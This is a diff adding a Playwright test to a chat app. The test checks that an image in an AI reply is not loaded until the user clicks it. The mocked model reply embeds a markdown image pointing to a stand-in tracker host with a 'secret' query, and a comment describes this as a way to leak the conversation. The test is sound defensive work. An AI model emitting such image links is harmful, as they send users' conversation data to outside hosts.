@@ -98,3 +98,32 @@ test('Settings says where data goes and links to bug reports', async ({ page }) 
   await expect(page.getByTestId('settings-privacy')).toContainText('r.jina.ai')
   await expect(page.getByTestId('report-problem')).toHaveAttribute('href', 'https://github.com/akarshgopal/treechat/issues/new')
 })
+
+test('an image in a reply is not fetched until asked for', async ({ page }, testInfo) => {
+  test.skip(Boolean(testInfo.project.use.isMobile), 'same rendering on phones')
+  // A reply that would leak the conversation through an image URL if it loaded by itself.
+  const fetched: string[] = []
+  await page.route('https://tracker.example/**', (route) => {
+    fetched.push(route.request().url())
+    return route.fulfill({ status: 200, contentType: 'image/png', body: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64') })
+  })
+  await page.route('https://openrouter.ai/api/v1/chat/completions', (route) => route.fulfill({
+    status: 200,
+    contentType: 'text/event-stream',
+    body: 'data: {"choices":[{"delta":{"content":"Here is a chart: ![sales chart](https://tracker.example/pixel.png?q=secret) — done."}}]}\n\ndata: [DONE]\n\n',
+  }))
+  await page.evaluate(() => localStorage.setItem('treechat:provider:v1', JSON.stringify({ provider: 'openrouter', apiKey: 'test-only-never-sent', model: 'openai/gpt-5.6-luna' })))
+  await page.reload()
+  await page.getByTestId('thread-composer').fill('Show me a chart')
+  await page.getByTestId('thread-composer').press('Enter')
+  await expect(page.locator('article').last()).toContainText('done.')
+  await page.waitForTimeout(500)
+  expect(fetched).toEqual([])
+  const placeholder = page.getByTestId('remote-image')
+  await expect(placeholder).toContainText('sales chart')
+  await expect(placeholder).toContainText('tracker.example')
+
+  await placeholder.click()
+  await expect(page.locator('article').last().locator('img')).toBeVisible()
+  expect(fetched).toEqual(['https://tracker.example/pixel.png?q=secret'])
+})
